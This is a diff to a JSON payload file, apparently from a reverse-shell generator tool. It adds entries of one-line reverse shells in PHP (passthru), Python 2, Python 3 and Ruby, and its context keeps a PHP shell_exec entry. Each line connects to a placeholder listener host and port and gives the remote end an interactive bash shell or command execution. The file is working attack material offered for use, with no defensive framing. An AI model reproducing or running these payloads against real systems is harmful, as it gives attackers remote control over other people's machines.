@@ -44,6 +44,27 @@
             "id":"9",
             "name":"PHP shell_exec",
             "shell":"php -r '$sock=fsockopen(\"lhost\",lport);shell_exec(\"/bin/bash <&3 >&3 2>&3\");'"
+        },
+        {
+            "id":"10",
+            "name":"PHP passthru",
+            "shell":"php -r '$sock=fsockopen(\"lhost\",lport);passthru(\"/bin/bash <&3 >&3 2>&3\");'"
+        },
+        {
+            "id":"11",
+            "name":"python2 -c",
+            "shell":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"lhost\",lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+        },
+        {
+            "id":"12",
+            "name":"python3 -c",
+            "shell":"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"lhost\",lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+        },
+        {
+            "id":"13",
+            "name":"ruby no-sh",
+            "shell":"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"lhost\",\"lport\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
         }
+
     ]
 }
